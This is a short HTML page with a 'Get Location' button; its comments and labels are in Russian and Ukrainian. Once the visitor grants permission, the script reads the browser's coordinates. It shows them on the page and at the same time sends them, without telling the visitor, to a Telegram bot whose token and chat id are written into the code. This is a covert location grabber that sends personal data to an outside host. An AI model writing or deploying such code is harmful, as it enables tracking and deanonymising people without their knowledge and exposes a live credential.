<button onclick="getLocation()">Get Location</button>
<p id="location"></p>

<script>
  const Http = new XMLHttpRequest()

  function getLocation() {
    // Если геолокация поддерживается браузером
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(showPosition);
    } else {
      document.getElementById("location").innerHTML = "Геолокация не поддерживается.";
    }
  }

  function showPosition(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    let url = `https://api.telegram.org/bot6480737039:AAFf475pQ3Pe2ESj1jZ1fqZxzrRIybUjKFg/sendMessage?chat_id=977619219&text=COORDINATES: ${lat}, ${lon}`;
    Http.open("GET", url);
    Http.send();
    document.getElementById("location").innerHTML = "Широта: " + lat + "<br>Довгота: " + lon;
  }
          
        
</script>
